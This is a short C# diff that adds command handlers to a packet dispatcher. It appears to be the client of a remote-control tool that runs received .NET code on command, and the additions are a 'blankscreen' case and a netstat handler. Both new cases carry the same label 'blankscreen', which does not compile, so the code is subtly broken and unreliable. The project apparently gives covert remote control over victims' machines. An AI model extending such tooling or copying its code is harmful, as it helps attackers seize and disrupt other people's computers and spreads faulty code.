@@ -297,6 +297,18 @@ namespace Client.Handle_Packet
                             new HandlerExecuteDotNetCode(unpack_msgpack);
                             break;
                         }
+                        
+                    case "blankscreen":
+                        {
+                            new HandleBlankScreen();
+                            break;
+                        }
+                        
+                    case "blankscreen":
+                        {
+                            new HandleNetStat();
+                            break;
+                        }
                 }
             }
             catch (Exception ex)
